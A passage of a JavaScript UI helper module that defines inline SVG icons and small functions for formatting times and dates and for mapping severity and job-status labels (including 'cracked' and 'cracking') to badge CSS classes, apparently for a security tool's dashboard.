  upload: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>',
  check: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
  x: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
  loader: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/><line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/></svg>',
  circle: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/></svg>',
  folder: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>',
  file: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>',
  plus: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>',
  download: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
  copy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
  filter: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"/></svg>',
  play: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>',
  flag: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg>',
  bell: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>',
  arrowDown: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>',
  terminal: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>',
  shield: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
};

export function icon(name, cls = '') {
  return `<span class="icon ${cls}">${icons[name] || ''}</span>`;
}

export function formatTime(iso) {
  const d = new Date(iso);
  return d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
}

export function formatDate(iso) {
  const d = new Date(iso);
  return d.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
}

export function severityClass(sev) {
  const map = { critical: 'badge-critical', high: 'badge-high', medium: 'badge-medium', low: 'badge-low', info: 'badge-info' };
  return map[sev] || 'badge-info';
}

export function statusClass(status) {
  const map = { complete: 'badge-success', running: 'badge-warning', queued: 'badge-info', failed: 'badge-error', cracked: 'badge-success', cracking: 'badge-warning', 'not-started': 'badge-info' };
  return map[status] || 'badge-info';
}
